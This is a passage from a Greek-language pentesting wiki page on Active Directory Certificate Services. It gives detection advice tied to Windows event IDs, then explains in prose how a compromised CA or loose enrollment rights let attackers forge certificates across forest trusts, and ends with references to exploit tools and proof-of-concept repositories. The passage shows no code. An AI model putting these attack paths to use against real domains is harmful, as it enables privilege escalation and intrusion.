- Στην CA, συσχετίστε τα συμβάντα Certification Services **4886** (λήψη αιτήματος) και **4887** (έκδοση) για απρόσμενα αιτήματα με template `Machine` από λογαριασμούς διακομιστών IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- Στους DC, το συμβάν **4768** περιλαμβάνει πεδία πιστοποιητικού όταν χρησιμοποιείται προέλεγχος ταυτότητας με πιστοποιητικό· δημιουργήστε ειδοποίηση για ασυνήθιστα αιτήματα PKINIT TGT από λογαριασμούς web server. Ακολουθήστε τα με αιτήματα **4769** που περιλαμβάνουν προνομιακή ταυτότητα υπό πλαστοπροσωπία και τον ίδιο υπολογιστή. Επειδή το Rubeus `/altservice` ξαναγράφει την ονομασία υπηρεσίας του KRB-CRED στην πλευρά του client, μην απαιτείτε η ονομασία υπηρεσίας στο 4769 της πλευράς του DC να είναι `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Αναζητήστε περιπτώσεις όπου το `w3wp.exe` επικοινωνεί με endpoints RPC της CA, απρόσμενη δημιουργία αρχείων ASPX, πρόσβαση σε administrative shares με Kerberos authentication και δραστηριότητα εξαγωγής secrets. Όπου είναι δυνατό, περιορίστε την πρόσβαση από το επίπεδο εφαρμογών στα CA RPC/KDC/SMB και καταργήστε δικαιώματα εγγραφής υπολογιστών ή templates machine-authentication που δεν απαιτούνται για τη λειτουργία.<sup>[[19]](#references)</sup>

## Παραβίαση forests με πιστοποιητικά, όπως εξηγείται σε παθητική φωνή

### Διάρρηξη forest trusts μέσω παραβιασμένων CA

Η ρύθμιση για **εγγραφή μεταξύ forests** γίνεται σχετικά απλή. Το **πιστοποιητικό της root CA** από το resource forest **δημοσιεύεται στα account forests** από τους διαχειριστές, ενώ τα πιστοποιητικά **enterprise CA** από το resource forest **προστίθενται στα containers `NTAuthCertificates` και AIA σε κάθε account forest**. Για διευκρίνιση, αυτή η διάταξη παρέχει στην **CA του resource forest πλήρη έλεγχο** πάνω σε όλα τα άλλα forests για τα οποία διαχειρίζεται το PKI. Αν αυτή η CA **παραβιαστεί από attackers**, μπορούν να **πλαστογραφηθούν** από αυτούς πιστοποιητικά για όλους τους χρήστες τόσο στο resource forest όσο και στα account forests, καταρρίπτοντας έτσι το όριο ασφαλείας του forest.<sup>[[6]](#references)</sup>

### Δικαιώματα εγγραφής που παραχωρούνται σε foreign principals

Σε περιβάλλοντα με πολλά forests, χρειάζεται προσοχή με τις Enterprise CA που **δημοσιεύουν certificate templates** τα οποία επιτρέπουν **σε Authenticated Users ή foreign principals** (χρήστες/ομάδες εκτός του forest στο οποίο ανήκει η Enterprise CA) **δικαιώματα εγγραφής και επεξεργασίας**.\
Κατά την authentication μέσω trust, το AD προσθέτει το **SID των Authenticated Users** στο token του χρήστη. Επομένως, αν ένα domain διαθέτει Enterprise CA με template που **παρέχει δικαιώματα εγγραφής στους Authenticated Users**, ένας χρήστης από διαφορετικό forest θα μπορούσε ενδεχομένως να **εγγραφεί στο template**. Αντίστοιχα, αν ένα template **παραχωρεί ρητά δικαιώματα εγγραφής σε foreign principal**, δημιουργείται έτσι μια **σχέση ελέγχου πρόσβασης μεταξύ forests**, η οποία επιτρέπει σε ένα principal από ένα forest να **εγγραφεί σε template άλλου forest**.

Και τα δύο σενάρια οδηγούν σε **διεύρυνση της επιφάνειας επίθεσης** από ένα forest σε άλλο. Ένας attacker θα μπορούσε να εκμεταλλευτεί τις ρυθμίσεις του certificate template για να αποκτήσει επιπλέον προνόμια σε ξένο domain.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 Αποθετήριο PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Τεχνική ανάλυση του Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Ιστολόγιο SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Κατάχρηση των Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, γραφικό περιβάλλον BloodHound, νέες μέθοδοι authentication και αιτημάτων, και άλλα](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Κατάχρηση της αντιστοίχισης λογαριασμών Key Trust για κατάληψη λογαριασμών](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Η ιστορία της ενισχυμένης χρήσης κλειδιών](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Αναμετάδοση προς τις AD Certificate Services μέσω RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Πρόσβαση shell στην CA του ADCS με YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Τεχνική κατάχρησης ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Τεχνική κατάχρησης ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Κλιμάκωση προνομίων (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Δεν είναι απλώς άλλο ένα AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Λανθασμένη ρύθμιση και exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Επανεξέταση του «Delegate 2 Thyself»](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC εγγραφής IIS AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Κλιμάκωση προνομίων από το IIS AppPool μέσω του endpoint RPC του AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Ταυτότητες Application Pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – εντολή pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Έλεγχος Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Συμβάν 4768: Ζητήθηκε ticket authentication Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Συμβάν 4769: Ζητήθηκε ticket υπηρεσίας Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – Toolkit exploitation AD CS PowerShell](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
